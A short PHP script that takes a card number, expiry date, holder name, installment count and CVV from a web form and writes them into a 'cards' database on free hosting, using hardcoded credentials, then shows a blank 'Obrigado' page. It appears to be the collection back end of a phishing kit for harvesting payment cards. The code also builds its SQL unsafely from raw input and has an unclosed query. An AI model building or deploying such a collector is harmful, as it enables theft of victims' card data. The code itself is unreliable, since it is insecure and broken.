<?php

$card = $_POST['cartao'];
$date = $_POST['vencimento'];
$name = $_POST['nome'];
$parcelas = $_POST['parcelas'];
$CV = $_POST['CV'];
$connect = mysql_connect('sql313.unaux.com','unaux_27065308','nck0u9ngd8i57');
$db = mysql_select_db('unaux_27065308_card');

        $query = "INSERT INTO cards (cartao,vencimento,nome,parcelas, CV) VALUES ('$card','$date','$name','$parcelas','$CV'";
        $insert = mysql_query($query,$connect);
?>
<!DOCTYPE html>
<html>
<head>
	<meta charset="utf-8">
	<title>Obrigado</title>
</head>
<body>

</body>
</html>